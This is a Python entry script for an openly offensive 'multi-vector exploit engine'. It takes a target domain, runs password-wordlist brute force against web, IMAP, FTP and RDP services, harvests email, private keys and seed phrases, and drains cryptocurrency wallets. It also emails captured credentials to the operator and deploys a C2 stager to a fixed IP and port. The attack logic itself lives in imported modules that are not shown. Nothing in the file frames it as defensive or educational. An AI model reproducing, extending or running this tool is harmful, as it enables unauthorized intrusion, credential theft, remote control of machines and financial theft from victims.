import asyncio
import sys
import time
from modules.loader import load_wordlist
from modules.parser import parse_target_source
from modules.engine import run_autonomous_engine
from modules.dumper import harvest_email_intelligence
from modules.mail import send_breach_alert
from modules.payloads import deploy_c2_stager
from modules.keyharvester import harvest_private_keys
from modules.drainer import check_and_drain_wallet

# Cyberpunk Neon ANSI Color Palette
CYAN = "\033[96m"
GREEN = "\033[92m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RED = "\033[91m"
DARK_GRAY = "\033[90m"
RESET = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"

# Scaled down by 50% for optimal mobile terminal view (3 rows)
BANNER = f"""{GREEN}{BOLD}
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗  ██████╗  ██████╗ 
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
 ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 
{RESET}{CYAN}═════════════════════════════════════════════════════════════
         [NEURAL RECON & MULTI-VECTOR EXPLOIT ENGINE]
═════════════════════════════════════════════════════════════{RESET}
"""

def main():
    # Clear screen for crisp futuristic launch
    sys.stdout.write("\033[2J\033[H")
    print(BANNER)
    
    # Futuristic input prompt with strict target sanitization
    raw_target = input(f"{CYAN}{BOLD}[SYS_PROMPT] >> Enter Target Host/Domain (e.g., target.com): {RESET}").strip()
    if not raw_target:
        print(f"{RED}[CRITICAL] Target parameter missing. Aborting protocol.{RESET}")
        sys.exit(1)

    # Sanitize input to completely prevent domain bleeding or protocol pollution
    target = raw_target
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    target = target.split('/')[0].split(':')[0]

    print(f"\n{CYAN}[*] Target cleanly isolated: {target}{RESET}")
    print(f"{YELLOW}[INIT] Injecting payloads and loading local wordlist dictionaries...{RESET}")
    time.sleep(0.4)
    
    try:
        passwords = load_wordlist("config/passwords.txt")
    except Exception as e:
        print(f"{RED}[ERROR] Wordlist mount failed: {e}{RESET}")
        sys.exit(1)

    print(f"{GREEN}[SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.{RESET}")

    # Step 1: Real-time DOM Inspection, Security Header Audit & Session Hijacking
    asyncio.run(parse_target_source(target))

    print(f"{MAGENTA}{BOLD}[ENGINE] Spawning asynchronous threads and initializing socket rings...\n{RESET}")
    time.sleep(0.5)

    # Step 2: Launch Wireshark Packet Telemetry & Stealth Multi-Vector Engine (Web, IMAP, FTP, RDP)
    hits, duration = asyncio.run(run_autonomous_engine(target, passwords))

    # Step 3: Post-Exploitation, Intelligence Harvesting & Financial Sweep
    if hits:
        asyncio.run(harvest_email_intelligence(target, hits))
        
        print(f"\n{GREEN}[+] Initiating post-exploitation asset harvesting & financial sweep...{RESET}")
        
        # 1. Harvest Private Keys & Seed Phrases (All Chains)
        keys_found = harvest_private_keys(".")
        
        # 2. Universal Multi-Asset Check & Automated Sweep (Processes EVM, BTC, LTC, XRP, SOL, Seeds)
        drain_results = []
        for key in keys_found:
            key_content = key.get("key_content")
            key_type = key.get("type")
            
            print(f"\n{YELLOW}[*] Processing harvested artifact [{key_type}] for balance audit...{RESET}")
            try:
                bal, drained, tx = check_and_drain_wallet(key_content)
                drain_results.append({
                    "type": key_type,
                    "artifact": key_content[:15] + "...", 
                    "balance": bal, 
                    "drained": drained, 
                    "tx": tx
                })
            except Exception as e:
                print(f"{RED}[-] Drainage routing error for artifact: {e}{RESET}")

        # 3. Dispatch Encrypted Email Alert to Your Inbox
        for hit in hits:
            send_breach_alert(target, hit)
            
        # 4. Deploy Mobile C2 Stager Package
        deploy_c2_stager("10.0.0.100", 4444)

    # Cyberpunk Completion Dashboard
    print(f"\n{CYAN}═════════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{GREEN}[*] MISSION STATUS: COMPLETE (Elapsed: {duration:.2f}s){RESET}")
    
    if hits:
        print(f"{BOLD}{BLINK}[+++] BREACH DETECTED: {len(hits)} authorization vectors successfully bypassed!{RESET}")
        for idx, hit in enumerate(hits, 1):
            print(f" {GREEN}├── Vector [{idx}]: Port {hit.get('port')} | Type: {hit.get('type')}")
            print(f" │    User: {hit.get('user')} | Key: {hit.get('password')}{RESET}")
    else:
        print(f"{YELLOW}[---] Perimeter secure. Target defense grid held against all {len(passwords)} vectors.{RESET}")
    
    print(f"{CYAN}═════════════════════════════════════════════════════════════{RESET}\n")

if __name__ == "__main__":
    main()
